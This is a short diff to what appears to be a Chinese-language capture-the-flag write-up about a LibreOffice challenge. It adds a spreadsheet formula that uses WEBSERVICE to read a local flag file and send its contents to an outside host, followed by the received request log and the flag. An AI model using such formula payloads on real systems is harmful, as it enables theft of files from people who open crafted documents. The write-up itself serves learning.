@@ -8,5 +8,10 @@
 
 讀出來的內容可以用`WEBSERVICE`往外傳
 
+`=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/home/libreoffice_admin/flag&quot;))`
+
+會收到帶有 flag 的 Request: `[01/Jun/2019:22:05:06 +0000] "OPTIONS /xfb%7Bwh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful%7D%0A HTTP/1.1" 200 193 "-" "LibreOffice"`
+
+`fb{wh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful}`
 
 詳細見payload: flag.fods
